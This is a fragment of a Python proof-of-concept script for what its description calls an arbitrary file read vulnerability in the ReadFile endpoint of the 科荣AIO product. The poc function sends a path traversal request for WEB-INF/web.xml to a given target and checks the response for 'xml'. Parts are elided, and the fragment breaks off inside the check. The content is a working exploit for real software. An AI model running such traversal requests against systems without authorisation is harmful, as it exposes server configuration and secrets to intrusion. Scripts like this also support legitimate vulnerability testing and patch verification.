...
def main():
    banner()
    parser = argparse.ArgumentParser(description="科荣AIO ReadFile存在任意文件读取漏洞")
...
def poc(target):
    ...
    url = target+'/ReadFile?tempFile=path&path=../../website/WEB-INF/&fileName=web.xml'

    try:
        res = requests.get(url=url,timeout=5,proxies=proxies).text
        if "xml" in res:
